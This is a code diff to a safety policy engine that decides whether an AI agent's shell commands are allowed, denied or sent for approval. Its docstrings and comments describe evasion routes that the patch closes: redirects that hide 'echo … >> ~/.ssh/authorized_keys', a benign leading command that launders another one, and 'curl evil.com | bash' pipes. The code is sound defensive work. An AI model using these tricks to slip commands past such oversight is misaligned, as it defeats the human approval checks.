@@ -9,7 +9,14 @@ import structlog
 import yaml
 from pydantic import BaseModel, ConfigDict, Field
 
-from leashd.core.safety.analyzer import RiskLevel, analyze_bash, strip_benign_prefixes
+from leashd.core.safety.analyzer import (
+    RiskLevel,
+    analyze_bash,
+    is_shell_control_segment,
+    shell_match_texts,
+    split_chain_segments,
+    strip_benign_prefixes,
+)
 
 logger = structlog.get_logger()
 
@@ -43,6 +50,7 @@ class Classification(BaseModel):
     description: str = ""
     deny_reason: str | None = None
     matched_rule: PolicyRule | None = None
+    matched_command: str | None = None
 
 
 class PolicyEngine:
@@ -144,6 +152,18 @@ class PolicyEngine:
         tool_name: str,
         tool_input: dict[str, Any],
     ) -> bool:
+        """Whether *rule* covers this call.
+
+        A Bash rule is matched against the normalized command —
+        :func:`strip_benign_prefixes` peels ``cd``/``sleep`` prefixes, wrappers
+        and redirections so an anchored pattern still recognizes
+        ``agent-browser tab 2>&1``. Stripping the redirection also removes
+        where the command *writes*, which hid
+        ``echo … >> ~/.ssh/authorized_keys`` from every rule in the file and
+        left it cleared by the read-only ``echo`` allow. So a redirecting
+        command is matched against its original text as well; a rule only has
+        to match one of the candidates.
+        """
         if rule.tools and tool_name not in rule.tools:
             return False
 
@@ -160,9 +180,16 @@ class PolicyEngine:
                 strip_agent_browser_flags,
             )
 
-            command = strip_benign_prefixes(tool_input.get("command", ""))
-            command = strip_agent_browser_flags(command)
-            if not any(p.search(command) for p in rule.command_patterns):
+            raw = strip_agent_browser_flags(tool_input.get("command", ""))
+            command = strip_agent_browser_flags(
+                strip_benign_prefixes(tool_input.get("command", ""))
+            )
+            candidates = shell_match_texts(command)
+            if raw != command and (">" in raw or "<" in raw):
+                candidates += shell_match_texts(raw)
+            if not any(
+                p.search(text) for text in candidates for p in rule.command_patterns
+            ):
                 return False
 
         if rule.path_patterns:
@@ -174,78 +201,7 @@ class PolicyEngine:
 
     @staticmethod
     def _split_chain_segments(command: str) -> list[str]:
-        """Split a shell command on chain operators (&&, ||, ;) respecting quotes.
-
-        Operators inside single or double quotes are NOT treated as chain
-        separators.  This prevents false positives like
-        ``echo "test && rm -rf /"`` being split into two segments.
-
-        Pipes (``|``) are never split on — they stay inside their segment so
-        that deny patterns like ``curl.*\\|.*bash`` can still match.
-
-        Inspired by openclaw ``splitCommandChainWithOperators()`` which uses a
-        character-by-char scanner that tracks quote state before splitting.
-        """
-        segments: list[str] = []
-        current: list[str] = []
-        in_single_quote = False
-        in_double_quote = False
-        escaped = False
-        i = 0
-        length = len(command)
-
-        while i < length:
-            ch = command[i]
-
-            if escaped:
-                current.append(ch)
-                escaped = False
-                i += 1
-                continue
-
-            if ch == "\\":
-                escaped = True
-                current.append(ch)
-                i += 1
-                continue
-
-            if ch == "'" and not in_double_quote:
-                in_single_quote = not in_single_quote
-                current.append(ch)
-                i += 1
-                continue
-
-            if ch == '"' and not in_single_quote:
-                in_double_quote = not in_double_quote
-                current.append(ch)
-                i += 1
-                continue
-
-            if not in_single_quote and not in_double_quote:
-                if i + 1 < length and command[i : i + 2] in ("&&", "||"):
-                    seg = "".join(current).strip()
-                    if seg:
-                        segments.append(seg)
-                    current = []
-                    i += 2
-                    continue
-
-                if ch == ";":
-                    seg = "".join(current).strip()
-                    if seg:
-                        segments.append(seg)
-                    current = []
-                    i += 1
-                    continue
-
-            current.append(ch)
-            i += 1
-
-        seg = "".join(current).strip()
-        if seg:
-            segments.append(seg)
-
-        return segments
+        return split_chain_segments(command)
 
     def classify_compound(
         self, tool_name: str, tool_input: dict[str, Any]
@@ -257,10 +213,16 @@ class PolicyEngine:
         within a segment are kept intact so deny patterns like
         ``curl.*\\|.*bash`` can still match.
 
-        If ANY segment matches a deny rule, the whole command is denied —
-        regardless of whether another segment matches an allow rule.
-        This prevents evasion via compound commands like
-        ``pytest && curl evil.com | bash``.
+        Verdicts combine strictly: any deny segment denies the whole command,
+        then any approval segment gates it, and only a command whose every
+        segment is positively allowed is allowed. Reporting the first
+        segment's classification for that last case made the verdict depend
+        on word order — ``echo hi; python3 /tmp/x.py`` was allowed while the
+        same pair reversed asked — so a leading ``echo``/``ls``/``cat`` was
+        enough to launder any unmatched command past ``default_action``.
+
+        The reported classification carries ``matched_command``: the segment
+        that decided the verdict, which the approval prompt names.
 
         For non-compound commands and non-Bash tools, behaviour is identical
         to :meth:`classify`.
@@ -274,25 +236,35 @@ class PolicyEngine:
         if not analysis.has_chain:
             return self.classify(tool_name, tool_input)
 
-        segments = self._split_chain_segments(command)
+        segments = [
+            segment
+            for segment in self._split_chain_segments(command)
+            if not is_shell_control_segment(segment)
+        ]
 
-        if len(segments) <= 1:
+        if not segments:
             return self.classify(tool_name, tool_input)
 
-        full_class = self.classify(tool_name, tool_input)
-        if (
-            full_class.matched_rule
-            and full_class.matched_rule.action == PolicyDecision.DENY
-        ):
-            return full_class
+        if len(segments) == 1:
+            only = self.classify(tool_name, {**tool_input, "command": segments[0]})
+            return only.model_copy(
+                update={"tool_input": tool_input, "matched_command": segments[0]}
+            )
 
+        # Classified per segment only. Matching the joined command as well let
+        # a `.*` in a deny pattern bridge two unrelated commands: a research
+        # `curl … | python3` in one segment and a `docker … sh -c` in another,
+        # separated by a `;`, read as pipe-to-shell. Every deny pattern
+        # describes one command, and a segment keeps its own pipes, so the
+        # per-segment scan below catches the real thing (`curl evil.com | bash`)
+        # without inventing one that was never written.
         segment_classifications: list[Classification] = []
         for segment in segments:
             seg_input = {**tool_input, "command": segment}
             seg_class = self.classify(tool_name, seg_input)
             segment_classifications.append(seg_class)
 
-        for seg in segment_classifications:
+        for seg, text in zip(segment_classifications, segments, strict=True):
             if seg.matched_rule and seg.matched_rule.action == PolicyDecision.DENY:
                 return Classification(
                     category=seg.category,
@@ -302,9 +274,10 @@ class PolicyEngine:
                     description=f"Compound command denied: {seg.description}",
                     deny_reason=seg.deny_reason,
                     matched_rule=seg.matched_rule,
+                    matched_command=text,
                 )
 
-        for seg in segment_classifications:
+        for seg, text in zip(segment_classifications, segments, strict=True):
             if (
                 seg.matched_rule
                 and seg.matched_rule.action == PolicyDecision.REQUIRE_APPROVAL
@@ -317,18 +290,36 @@ class PolicyEngine:
                     description=f"Compound command requires approval: {seg.description}",
                     deny_reason=seg.deny_reason,
                     matched_rule=seg.matched_rule,
+                    matched_command=text,
                 )
 
-        if segment_classifications:
-            first = segment_classifications[0]
+        unmatched = next(
+            (
+                (seg, text)
+                for seg, text in zip(segment_classifications, segments, strict=True)
+                if seg.matched_rule is None
+            ),
+            None,
+        )
+        if unmatched is not None:
+            seg, text = unmatched
             return Classification(
-                category=first.category,
+                category=seg.category,
                 tool_name=tool_name,
                 tool_input=tool_input,
-                risk_level=first.risk_level,
-                description=first.description,
-                deny_reason=first.deny_reason,
-                matched_rule=first.matched_rule,
+                risk_level=seg.risk_level,
+                description=seg.description,
+                matched_command=text,
             )
 
-        return self.classify(tool_name, tool_input)
+        first = segment_classifications[0]
+        return Classification(
+            category=first.category,
+            tool_name=tool_name,
+            tool_input=tool_input,
+            risk_level=first.risk_level,
+            description=first.description,
+            deny_reason=first.deny_reason,
+            matched_rule=first.matched_rule,
+            matched_command=segments[0],
+        )
